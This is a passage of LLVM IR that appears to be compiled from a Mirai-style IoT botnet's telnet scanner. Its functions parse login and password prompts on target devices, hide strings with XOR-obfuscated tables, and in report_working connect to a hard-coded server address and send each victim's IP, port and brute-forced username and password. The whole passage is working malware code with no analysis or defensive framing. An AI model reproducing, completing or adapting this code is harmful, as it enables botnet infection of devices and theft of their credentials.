  %94 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %95 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %94, i32 0, i32 6
  %96 = load i32, i32* %95, align 4
  %97 = load i8*, i8** %10, align 8
  %98 = load i32, i32* %8, align 4
  %99 = sub nsw i32 %98, 1
  %100 = call i32 @util_memsearch(i8* noundef %93, i32 noundef %96, i8* noundef %97, i32 noundef %99)
  %101 = icmp ne i32 %100, -1
  %102 = zext i1 %101 to i32
  store i32 %102, i32* %7, align 4
  br i1 %101, label %103, label %105

103:                                              ; preds = %90
  %104 = load i32, i32* %7, align 4
  store i32 %104, i32* %6, align 4
  br label %105

105:                                              ; preds = %103, %90
  br label %106

106:                                              ; preds = %105, %88
  br label %107

107:                                              ; preds = %106, %70
  call void @table_lock_val(i8 noundef zeroext 26)
  call void @table_lock_val(i8 noundef zeroext 27)
  %108 = load i32, i32* %6, align 4
  %109 = icmp eq i32 %108, -1
  br i1 %109, label %110, label %111

110:                                              ; preds = %107
  store i32 0, i32* %2, align 4
  br label %113

111:                                              ; preds = %107
  %112 = load i32, i32* %6, align 4
  store i32 %112, i32* %2, align 4
  br label %113

113:                                              ; preds = %111, %110
  %114 = load i32, i32* %2, align 4
  ret i32 %114
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @consume_pass_prompt(%struct.scanner_connection* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 6
  %12 = load i32, i32* %11, align 4
  %13 = sub nsw i32 %12, 1
  store i32 %13, i32* %5, align 4
  br label %14

14:                                               ; preds = %57, %1
  %15 = load i32, i32* %5, align 4
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %17, label %60

17:                                               ; preds = %14
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 7
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [256 x i8], [256 x i8]* %19, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp eq i32 %24, 58
  br i1 %25, label %53, label %26

26:                                               ; preds = %17
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 7
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [256 x i8], [256 x i8]* %28, i64 0, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 62
  br i1 %34, label %53, label %35

35:                                               ; preds = %26
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %37, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = sext i8 %41 to i32
  %43 = icmp eq i32 %42, 36
  br i1 %43, label %53, label %44

44:                                               ; preds = %35
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 7
  %47 = load i32, i32* %5, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [256 x i8], [256 x i8]* %46, i64 0, i64 %48
  %50 = load i8, i8* %49, align 1
  %51 = sext i8 %50 to i32
  %52 = icmp eq i32 %51, 35
  br i1 %52, label %53, label %56

53:                                               ; preds = %44, %35, %26, %17
  %54 = load i32, i32* %5, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %6, align 4
  br label %60

56:                                               ; preds = %44
  br label %57

57:                                               ; preds = %56
  %58 = load i32, i32* %5, align 4
  %59 = add nsw i32 %58, -1
  store i32 %59, i32* %5, align 4
  br label %14, !llvm.loop !56

60:                                               ; preds = %53, %14
  %61 = load i32, i32* %6, align 4
  %62 = icmp eq i32 %61, -1
  br i1 %62, label %63, label %80

63:                                               ; preds = %60
  call void @table_unlock_val(i8 noundef zeroext 25)
  %64 = call i8* @table_retrieve_val(i32 noundef 25, i32* noundef %9)
  store i8* %64, i8** %7, align 8
  %65 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %65, i32 0, i32 7
  %67 = getelementptr inbounds [256 x i8], [256 x i8]* %66, i64 0, i64 0
  %68 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %69 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %68, i32 0, i32 6
  %70 = load i32, i32* %69, align 4
  %71 = load i8*, i8** %7, align 8
  %72 = load i32, i32* %9, align 4
  %73 = sub nsw i32 %72, 1
  %74 = call i32 @util_memsearch(i8* noundef %67, i32 noundef %70, i8* noundef %71, i32 noundef %73)
  %75 = icmp ne i32 %74, -1
  %76 = zext i1 %75 to i32
  store i32 %76, i32* %8, align 4
  br i1 %75, label %77, label %79

77:                                               ; preds = %63
  %78 = load i32, i32* %8, align 4
  store i32 %78, i32* %6, align 4
  br label %79

79:                                               ; preds = %77, %63
  br label %80

80:                                               ; preds = %79, %60
  call void @table_lock_val(i8 noundef zeroext 25)
  %81 = load i32, i32* %6, align 4
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %84

83:                                               ; preds = %80
  store i32 0, i32* %2, align 4
  br label %86

84:                                               ; preds = %80
  %85 = load i32, i32* %6, align 4
  store i32 %85, i32* %2, align 4
  br label %86

86:                                               ; preds = %84, %83
  %87 = load i32, i32* %2, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @consume_any_prompt(%struct.scanner_connection* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %7 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %7, i32 0, i32 6
  %9 = load i32, i32* %8, align 4
  %10 = sub nsw i32 %9, 1
  store i32 %10, i32* %5, align 4
  br label %11

11:                                               ; preds = %63, %1
  %12 = load i32, i32* %5, align 4
  %13 = icmp sgt i32 %12, 0
  br i1 %13, label %14, label %66

14:                                               ; preds = %11
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 7
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i64 0, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = icmp eq i32 %21, 58
  br i1 %22, label %59, label %23

23:                                               ; preds = %14
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i64 0, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp eq i32 %30, 62
  br i1 %31, label %59, label %32

32:                                               ; preds = %23
  %33 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %34 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %33, i32 0, i32 7
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [256 x i8], [256 x i8]* %34, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = icmp eq i32 %39, 36
  br i1 %40, label %59, label %41

41:                                               ; preds = %32
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 7
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [256 x i8], [256 x i8]* %43, i64 0, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp eq i32 %48, 35
  br i1 %49, label %59, label %50

50:                                               ; preds = %41
  %51 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %52 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %51, i32 0, i32 7
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [256 x i8], [256 x i8]* %52, i64 0, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = icmp eq i32 %57, 37
  br i1 %58, label %59, label %62

59:                                               ; preds = %50, %41, %32, %23, %14
  %60 = load i32, i32* %5, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %6, align 4
  br label %66

62:                                               ; preds = %50
  br label %63

63:                                               ; preds = %62
  %64 = load i32, i32* %5, align 4
  %65 = add nsw i32 %64, -1
  store i32 %65, i32* %5, align 4
  br label %11, !llvm.loop !57

66:                                               ; preds = %59, %11
  %67 = load i32, i32* %6, align 4
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %69, label %70

69:                                               ; preds = %66
  store i32 0, i32* %2, align 4
  br label %72

70:                                               ; preds = %66
  %71 = load i32, i32* %6, align 4
  store i32 %71, i32* %2, align 4
  br label %72

72:                                               ; preds = %70, %69
  %73 = load i32, i32* %2, align 4
  ret i32 %73
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 noundef zeroext 10)
  %7 = call i8* @table_retrieve_val(i32 noundef 10, i32* noundef %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* noundef %10, i32 noundef %13, i8* noundef %14, i32 noundef %16)
  %18 = icmp ne i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %1
  call void @table_lock_val(i8 noundef zeroext 10)
  store i32 -1, i32* %2, align 4
  br label %37

20:                                               ; preds = %1
  call void @table_lock_val(i8 noundef zeroext 10)
  call void @table_unlock_val(i8 noundef zeroext 9)
  %21 = call i8* @table_retrieve_val(i32 noundef 9, i32* noundef %6)
  store i8* %21, i8** %4, align 8
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 7
  %24 = getelementptr inbounds [256 x i8], [256 x i8]* %23, i64 0, i64 0
  %25 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %26 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %25, i32 0, i32 6
  %27 = load i32, i32* %26, align 4
  %28 = load i8*, i8** %4, align 8
  %29 = load i32, i32* %6, align 4
  %30 = sub nsw i32 %29, 1
  %31 = call i32 @util_memsearch(i8* noundef %24, i32 noundef %27, i8* noundef %28, i32 noundef %30)
  store i32 %31, i32* %5, align 4
  call void @table_lock_val(i8 noundef zeroext 9)
  %32 = load i32, i32* %5, align 4
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

34:                                               ; preds = %20
  store i32 0, i32* %2, align 4
  br label %37

35:                                               ; preds = %20
  %36 = load i32, i32* %5, align 4
  store i32 %36, i32* %2, align 4
  br label %37

37:                                               ; preds = %35, %34, %19
  %38 = load i32, i32* %2, align 4
  ret i32 %38
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @report_working(i32 noundef %0, i16 noundef zeroext %1, %struct.scanner_auth* noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.scanner_auth*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store %struct.scanner_auth* %2, %struct.scanner_auth** %6, align 8
  %12 = call i32 @fork() #7
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* %8, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %18, label %15

15:                                               ; preds = %3
  %16 = load i32, i32* %8, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %19

18:                                               ; preds = %15, %3
  br label %79

19:                                               ; preds = %15
  %20 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #7
  store i32 %20, i32* %9, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %23

22:                                               ; preds = %19
  br label %23

23:                                               ; preds = %22, %19
  call void @table_unlock_val(i8 noundef zeroext 2)
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call i32 @inet_addr(i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.33, i64 0, i64 0)) #7
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %27 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %26, i32 0, i32 0
  store i32 %25, i32* %27, align 4
  %28 = call i8* @table_retrieve_val(i32 noundef 2, i32* noundef null)
  %29 = bitcast i8* %28 to i16*
  %30 = load i16, i16* %29, align 2
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  call void @table_lock_val(i8 noundef zeroext 2)
  %32 = load i32, i32* %9, align 4
  %33 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @connect(i32 noundef %32, %struct.sockaddr* %36, i32 noundef 16)
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %42

39:                                               ; preds = %23
  %40 = load i32, i32* %9, align 4
  %41 = call i32 @close(i32 noundef %40)
  br label %42

42:                                               ; preds = %39, %23
  store i8 0, i8* %11, align 1
  %43 = load i32, i32* %9, align 4
  %44 = call i64 @send(i32 noundef %43, i8* noundef %11, i64 noundef 1, i32 noundef 16384)
  %45 = load i32, i32* %9, align 4
  %46 = bitcast i32* %4 to i8*
  %47 = call i64 @send(i32 noundef %45, i8* noundef %46, i64 noundef 4, i32 noundef 16384)
  %48 = load i32, i32* %9, align 4
  %49 = bitcast i16* %5 to i8*
  %50 = call i64 @send(i32 noundef %48, i8* noundef %49, i64 noundef 2, i32 noundef 16384)
  %51 = load i32, i32* %9, align 4
  %52 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %53 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %52, i32 0, i32 4
  %54 = call i64 @send(i32 noundef %51, i8* noundef %53, i64 noundef 1, i32 noundef 16384)
  %55 = load i32, i32* %9, align 4
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %57 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i32 0, i32 0
  %58 = load i8*, i8** %57, align 8
  %59 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %59, i32 0, i32 4
  %61 = load i8, i8* %60, align 4
  %62 = zext i8 %61 to i64
  %63 = call i64 @send(i32 noundef %55, i8* noundef %58, i64 noundef %62, i32 noundef 16384)
  %64 = load i32, i32* %9, align 4
  %65 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %66 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %65, i32 0, i32 5
  %67 = call i64 @send(i32 noundef %64, i8* noundef %66, i64 noundef 1, i32 noundef 16384)
  %68 = load i32, i32* %9, align 4
  %69 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %70 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %69, i32 0, i32 1
  %71 = load i8*, i8** %70, align 8
  %72 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %73 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %72, i32 0, i32 5
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i64
  %76 = call i64 @send(i32 noundef %68, i8* noundef %71, i64 noundef %75, i32 noundef 16384)
  %77 = load i32, i32* %9, align 4
  %78 = call i32 @close(i32 noundef %77)
  br label %79

79:                                               ; preds = %42, %18
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal signext i8 @can_consume(%struct.scanner_connection* noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #6

declare i64 @recv(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i8* @deobf(i8* noundef %0, i32* noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* noundef %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 noundef %13) #7
  store i8* %14, i8** %6, align 8
  %15 = load i8*, i8** %6, align 8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32*, i32** %4, align 8
  %18 = load i32, i32* %17, align 4
  %19 = add nsw i32 %18, 1
  call void @util_memcpy(i8* noundef %15, i8* noundef %16, i32 noundef %19)
  store i32 0, i32* %5, align 4
  br label %20

20:                                               ; preds = %58, %2
  %21 = load i32, i32* %5, align 4
  %22 = load i32*, i32** %4, align 8
  %23 = load i32, i32* %22, align 4
  %24 = icmp slt i32 %21, %23
  br i1 %24, label %25, label %61

25:                                               ; preds = %20
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = xor i32 %31, 222
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* %29, align 1
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = xor i32 %39, 222
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %37, align 1
  %42 = load i8*, i8** %6, align 8
  %43 = load i32, i32* %5, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = xor i32 %47, 251
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %45, align 1
  %50 = load i8*, i8** %6, align 8
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = xor i32 %55, 175
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %53, align 1
  br label %58

58:                                               ; preds = %25
  %59 = load i32, i32* %5, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %5, align 4
  br label %20, !llvm.loop !58

61:                                               ; preds = %20
  %62 = load i8*, i8** %6, align 8
  ret i8* %62
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @table_unlock_val(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 noundef zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @toggle_obf(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

27:                                               ; preds = %83, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %86

34:                                               ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

83:                                               ; preds = %34
  %84 = load i32, i32* %3, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %27, !llvm.loop !59

86:                                               ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @table_lock_val(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 noundef zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @table_retrieve_val(i32 noundef %0, i32* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

11:                                               ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

17:                                               ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_strlen(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
